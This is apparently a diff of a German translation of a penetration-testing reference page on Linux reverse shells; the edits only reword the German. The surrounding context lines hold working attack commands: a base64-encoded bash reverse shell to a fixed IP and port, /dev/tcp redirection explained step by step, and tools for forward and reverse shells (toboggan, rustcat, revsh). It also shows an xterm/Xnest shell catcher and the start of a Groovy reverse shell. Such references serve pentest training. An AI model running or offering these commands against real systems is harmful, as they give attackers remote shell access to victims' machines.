@@ -4,7 +4,7 @@
 
 **Wenn Sie Fragen zu einer dieser Shells haben, können Sie sie bei** [**https://explainshell.com/**](https://explainshell.com) **überprüfen.**
 
-## Vollständiges TTY
+## Full TTY
 
 **Sobald Sie eine Reverse-Shell erhalten haben,** [**lesen Sie diese Seite, um ein vollständiges TTY zu erhalten**](full-ttys.md)**.**
 
@@ -38,7 +38,7 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 2. **`>&`**: Dieser Teil des Befehls ist eine Kurznotation für **das Umleiten von sowohl Standardausgabe** (`stdout`) als auch **Standardfehler** (`stderr`) an **das gleiche Ziel**.
 3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Dies ist eine spezielle Datei, die **eine TCP-Verbindung zur angegebenen IP-Adresse und dem Port** darstellt.
 - Durch **das Umleiten der Ausgabe- und Fehlerströme zu dieser Datei** sendet der Befehl effektiv die Ausgabe der interaktiven Shell-Sitzung an die Maschine des Angreifers.
-4. **`0>&1`**: Dieser Teil des Befehls **leitet die Standardeingabe (`stdin`) an dasselbe Ziel wie die Standardausgabe (`stdout`) weiter**.
+4. **`0>&1`**: Dieser Teil des Befehls **leitet die Standardeingabe (`stdin`) an das gleiche Ziel wie die Standardausgabe (`stdout`) weiter**.
 
 ### In Datei erstellen und ausführen
 ```bash
@@ -79,7 +79,7 @@ Und dann kannst du ausführen:
 ```shell
 toboggan -m nix.py -i
 ```
-Um direkt eine interaktive Shell zu nutzen. Sie können `-b` für die Burpsuite-Integration hinzufügen und `-i` für einen einfacheren RCE-Wrap entfernen.
+Um direkt eine interaktive Shell zu nutzen. Sie können `-b` für die Burpsuite-Integration hinzufügen und `-i` entfernen, um einen einfacheren RCE-Wrap zu erhalten.
 
 Eine weitere Möglichkeit besteht darin, die `IppSec`-Forward-Shell-Implementierung zu verwenden [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
@@ -89,7 +89,7 @@ Sie müssen nur Folgendes anpassen:
 - Das Präfix und Suffix Ihres Payloads (falls vorhanden)
 - Die Art und Weise, wie der Payload gesendet wird (Header? Daten? Zusätzliche Informationen?)
 
-Dann können Sie einfach **Befehle senden** oder sogar **den `upgrade`-Befehl verwenden**, um ein vollständiges PTY zu erhalten (beachten Sie, dass Pipes mit einer ungefähren Verzögerung von 1,3 Sekunden gelesen und geschrieben werden).
+Dann können Sie einfach **Befehle senden** oder sogar den **`upgrade`-Befehl** verwenden, um ein vollständiges PTY zu erhalten (beachten Sie, dass Pipes mit einer ungefähren Verzögerung von 1,3 Sekunden gelesen und geschrieben werden).
 
 ## Netcat
 ```bash
@@ -238,12 +238,12 @@ curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_6
 ```
 Features:
 - Optional `--ssl` Flag für verschlüsselten Transport (TLS 1.3)
-- `-s` um beliebige Binärdatei (z.B. `/bin/sh`, `python3`) auf dem Opfer zu starten
+- `-s` um jede Binärdatei (z.B. `/bin/sh`, `python3`) auf dem Opfer zu starten
 - `--up` um automatisch auf ein vollständig interaktives PTY zu upgraden
 
 ## revsh (verschlüsselt & pivot-fähig)
 
-`revsh` ist ein kleiner C-Client/Server, der ein vollständiges TTY über einen **verschlüsselten Diffie-Hellman-Tunnel** bereitstellt und optional eine **TUN/TAP**-Schnittstelle für reverse VPN-ähnliches Pivoting anhängen kann.
+`revsh` ist ein kleines C-Client/Server, das ein vollständiges TTY über einen **verschlüsselten Diffie-Hellman-Tunnel** bereitstellt und optional eine **TUN/TAP**-Schnittstelle für reverse VPN-ähnliches Pivoting anhängen kann.
 ```bash
 # Build (or grab a pre-compiled binary from the releases page)
 git clone https://github.com/emptymonkey/revsh && cd revsh && make
@@ -338,7 +338,7 @@ Dies wird versuchen, eine Verbindung zu Ihrem System über Port 6001 herzustelle
 ```bash
 xterm -display 10.0.0.1:1
 ```
-Um die Reverse-Shell abzufangen, können Sie (die auf Port 6001 lauscht) verwenden:
+Um die Reverse-Shell zu fangen, können Sie Folgendes verwenden (das auf Port 6001 lauscht):
 ```bash
 # Authorize host
 xhost +targetip
@@ -347,7 +347,7 @@ Xnest :1
 ```
 ## Groovy
 
-von [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) HINWEIS: Java Reverse Shell funktioniert auch für Groovy
+von [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) HINWEIS: Java reverse shell funktioniert auch für Groovy
 ```bash
 String host="localhost";
 int port=8044;
